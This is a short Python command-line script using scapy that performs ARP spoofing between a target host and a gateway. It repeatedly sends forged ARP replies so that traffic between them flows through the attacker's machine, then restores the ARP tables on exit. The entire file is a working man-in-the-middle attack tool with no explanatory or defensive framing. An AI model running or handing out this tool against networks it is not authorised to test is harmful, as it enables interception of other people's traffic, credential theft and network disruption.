#!/usr/bin/env python3
import time

import scapy.all as scapy
import argparse

def get_mac_address(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    requested_broadcast = broadcast/request
    answer = scapy.srp(requested_broadcast, timeout=2, verbose=False)[0]
    if answer:
        return answer[0][1].src
    else:
        return "ff:ff:ff:ff:ff:ff"

def send_packet(victim_ip, router_ip, count):
    pack = scapy.ARP(op=2, pdst=f"{victim_ip}", hwdst=f'{get_mac_address(victim_ip)}', psrc=f"{router_ip}")
    scapy.send(pack, verbose=False)
    print(count, "\r[+] Sent: ", end='')

def restore(victim_ip, router_ip):
    pack = scapy.ARP(op=2, pdst=f"{victim_ip}", hwdst=f"{get_mac_address(victim_ip)}", psrc=f"{router_ip}", hwsrc=f"{get_mac_address(router_ip)}")
    scapy.send(pack, verbose=False, count=4)

def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help='write target ip')
    parser.add_argument('-g', '--gateway', dest='gateway', help='write gateway ip')
    return parser.parse_args()


arg = arguments()
try:
    start_time = time.time()
    count = 0
    while True:
        count += 2
        send_packet(arg.target, arg.gateway, count)
        send_packet(arg.gateway, arg.target, count)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nQuitting......")
    elapsed_time = time.time() - start_time
    print(f"Execution time: {round(elapsed_time,1)} seconds")
    print(f"Total packets: {count}")
    restore(arg.target, arg.gateway)
    restore(arg.gateway, arg.target)
